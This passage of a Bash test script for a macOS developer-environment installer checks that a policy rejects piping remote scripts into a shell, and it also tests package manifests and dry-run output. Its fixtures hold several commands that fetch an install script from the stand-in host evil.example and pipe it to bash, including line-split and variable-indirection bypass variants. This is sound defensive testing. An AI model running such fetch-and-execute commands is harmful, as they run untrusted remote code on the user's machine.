  else
    pass "远程 Shell 管道策略拒绝 printf 前缀绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'wget -qO- https://evil.example/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝 wget 绕过"
  else
    pass "远程 Shell 管道策略拒绝 wget 绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'curl -fsSL https://evil.example/install.sh | \' \
    '  bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝跨行绕过"
  else
    pass "远程 Shell 管道策略拒绝跨行绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'curl -fsSL https://evil.example/install.sh |' \
    '  bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝无反斜杠跨行绕过"
  else
    pass "远程 Shell 管道策略拒绝无反斜杠跨行绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'downloader=curl' \
    '"$downloader" -fsSL https://evil.example/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝变量间接调用"
  else
    pass "远程 Shell 管道策略拒绝变量间接调用"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'shell=bash' \
    'curl -fsSL https://evil.example/install.sh | "$shell"' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝变量 Shell 绕过"
  else
    pass "远程 Shell 管道策略拒绝变量 Shell 绕过"
  fi

  printf '%s\n' \
    '#!/bin/bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' \
    'curl -fsSL https://claude.ai/install.sh | bash' > "$fixture"
  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
    fail "远程 Shell 管道策略拒绝重复官方命令"
  else
    pass "远程 Shell 管道策略拒绝重复官方命令"
  fi

  command rm -r "$temporary_directory"
}

test_formula_manifest() {
  local list
  list="$(formulae)"
  local item
  for item in git git-lfs gh node pyenv python@3.12 uv curl wget jq ripgrep fzf fd tree coreutils gemini-cli ansible; do
    assert_contains "Formula 清单" "$list" "$item"
  done
  assert_not_contains "Formula 清单排除 CMake" "$list" "cmake"
  assert_not_contains "Formula 清单排除 Ninja" "$list" "ninja"
}

test_doctor_manifest() {
  local list
  list="$(doctor_commands)"
  assert_contains "doctor 检查 Ansible" "$list" "ansible"
  assert_contains "doctor 检查 Ansible Playbook" "$list" "ansible-playbook"
}

test_cask_manifest() {
  local list
  list="$(casks)"
  local item
  for item in google-chrome feishu chatgpt ghostty visual-studio-code cc-switch localsend font-hack-nerd-font font-jetbrains-mono-nerd-font font-maple-mono-nf-cn; do
    assert_contains "Cask 清单" "$list" "$item"
  done
}

test_brewfile_profile_manifest() {
  local basic_manifest
  local standard_manifest
  local full_manifest
  local item

  basic_manifest="$(sed -n 's/^[[:space:]]*brew "\([^"]*\)".*/\1/p; s/^[[:space:]]*cask "\([^"]*\)".*/\1/p' "$ROOT_DIR/Brewfile")"
  standard_manifest="$(sed -n 's/^[[:space:]]*brew "\([^"]*\)".*/\1/p; s/^[[:space:]]*cask "\([^"]*\)".*/\1/p' "$ROOT_DIR/Brewfile.standard" 2>/dev/null || true)"
  full_manifest="$(sed -n 's/^[[:space:]]*brew "\([^"]*\)".*/\1/p; s/^[[:space:]]*cask "\([^"]*\)".*/\1/p' "$ROOT_DIR/Brewfile.full" 2>/dev/null || true)"

  assert_contains "基础 Brewfile 包含 LocalSend" "$basic_manifest" "localsend"
  assert_contains "基础 Brewfile 包含 Starship" "$basic_manifest" "starship"
  for item in azure-cli awscli kubernetes-cli docker glab supabase go cloudflared orbstack; do
    assert_not_contains "基础 Brewfile 不含适中工具" "$basic_manifest" "$item"
    assert_contains "适中 Brewfile 包含新增工具" "$standard_manifest" "$item"
  done
  assert_contains "适中 Brewfile 包含 Clash Verge" "$standard_manifest" "clash-verge-rev"
  for item in aliyun-cli libpq rustup android-studio android-commandlinetools arc thebrowsercompany-dia hapigo betterandbetter typeless vibe-island neteasemusic wechat; do
    assert_not_contains "适中 Brewfile 不含完整工具" "$standard_manifest" "$item"
    assert_contains "完整 Brewfile 包含新增工具" "$full_manifest" "$item"
  done
  assert_not_contains "完整 Brewfile 不引入 mas" "$full_manifest" "mas"
}

test_npm_manifest() {
  local list
  list="$(npm_global_packages)"
  local item
  for item in corepack @openai/codex @larksuite/cli @lingjingai/awb-cli @lingjingai/lj-awb-cli chrome-devtools-mcp @modelcontextprotocol/server-postgres; do
    assert_contains "npm 全局清单" "$list" "$item"
  done
}

test_vscode_manifest() {
  local list
  list="$(vscode_extensions)"
  local item
  for item in anthropic.claude-code openai.chatgpt continue.continue ms-python.python ms-python.vscode-pylance ms-vscode-remote.remote-ssh vue.volar ritwickdey.liveserver davidanson.vscode-markdownlint ms-ceintl.vscode-language-pack-zh-hans; do
    assert_contains "VS Code 扩展清单" "$list" "$item"
  done
  assert_contains "基础 VS Code 清单包含 EditorConfig" "$list" "editorconfig.editorconfig"
  assert_not_contains "VS Code 清单不含 Docker 扩展" "$list" "docker.docker"
}

test_dry_run_contract() {
  local output
  if output="$(MAC_DEV_BOOTSTRAP_TEST=0 /bin/bash "$ROOT_DIR/install.sh" --dry-run 2>&1)"; then
    if printf '%s\n' "$output" | grep -Fq '[模拟执行]'; then
      pass "dry-run 可执行且不落盘"
    else
      fail "dry-run 输出缺少模拟标记"
    fi
    if printf '%s\n' "$output" | grep -Fq 'Xcode Command Line Tools'; then
      fail "安装计划不应包含 Xcode Command Line Tools"
    else
      pass "安装计划不包含 Xcode Command Line Tools"
    fi
    if printf '%s\n' "$output" | grep -Fq 'Homebrew 镜像：国内'; then
      pass "安装计划显示默认 Homebrew 国内镜像"
    else
      fail "安装计划显示默认 Homebrew 国内镜像"
    fi
    if printf '%s\n' "$output" | grep -Fq '安装档位：基础'; then
      pass "dry-run 默认使用基础档位"
    else
      fail "dry-run 默认使用基础档位"
    fi
  else
    fail "dry-run 应成功退出"
  fi

  if output="$(MAC_DEV_BOOTSTRAP_TEST=0 /bin/bash "$ROOT_DIR/install.sh" \
    --profile standard --dry-run 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq '安装档位：适中' && \
    printf '%s\n' "$output" | grep -Fq 'azure-cli' && \
    printf '%s\n' "$output" | grep -Fq 'orbstack'; then
    pass "dry-run 展示适中档位新增工具"
  else
    fail "dry-run 展示适中档位新增工具"
  fi

  if output="$(MAC_DEV_BOOTSTRAP_TEST=0 /bin/bash "$ROOT_DIR/install.sh" \
    --profile full --dry-run 2>&1)" && \
    printf '%s\n' "$output" | grep -Fq '安装档位：完整' && \
    printf '%s\n' "$output" | grep -Fq 'aliyun-cli' && \
    printf '%s\n' "$output" | grep -Fq 'thebrowsercompany-dia' && \
    printf '%s\n' "$output" | grep -Fq 'Xcode：https://apps.apple.com/app/xcode/id497799835' && \
    printf '%s\n' "$output" | grep -Fq 'documents@openai-primary-runtime'; then
    pass "dry-run 展示完整档位新增工具与人工步骤"
  else
    fail "dry-run 展示完整档位新增工具与人工步骤"
  fi

  if MAC_DEV_BOOTSTRAP_TEST=0 /bin/bash "$ROOT_DIR/install.sh" \
    --profile invalid --dry-run >/dev/null 2>&1; then
    fail "dry-run 拒绝非法安装档位"
  else
    pass "dry-run 拒绝非法安装档位"
  fi

  if MAC_DEV_BOOTSTRAP_TEST=0 MAC_DEV_HOMEBREW_MIRROR=invalid \
    /bin/bash "$ROOT_DIR/install.sh" --dry-run >/dev/null 2>&1; then
    fail "dry-run 拒绝非法 Homebrew 镜像模式"
  else
    pass "dry-run 拒绝非法 Homebrew 镜像模式"
  fi
}

test_xcode_clt_not_managed() {
  if grep -Fq 'xcode-select --install' "$ROOT_DIR/install.sh"; then
    fail "脚本不应主动安装 Xcode Command Line Tools"
  else
    pass "脚本不主动安装 Xcode Command Line Tools"
  fi
}

test_platform_contract
test_input_validation
test_install_profile_contract
test_homebrew_mirror_contract
test_homebrew_mirror_installer
test_homebrew_initialization_failure
test_homebrew_mirror_shell_config
test_prompt_and_terminal_templates
test_mcp_plugin_and_skill_install_contract
test_full_toolchain_install_contract
test_localsend_installer_fallback
test_claude_installer_contract
test_claude_installer_fallback
test_claude_installer_verification
test_tui_contract
test_remote_shell_pipeline_policy
test_formula_manifest
test_cask_manifest
test_brewfile_profile_manifest
test_npm_manifest
test_vscode_manifest
test_doctor_manifest
test_dry_run_contract
test_xcode_clt_not_managed

printf '\n测试汇总：%d 通过，%d 失败\n' "$PASS_COUNT" "$FAIL_COUNT"
if [[ "$FAIL_COUNT" -ne 0 ]]; then
  exit 1
fi
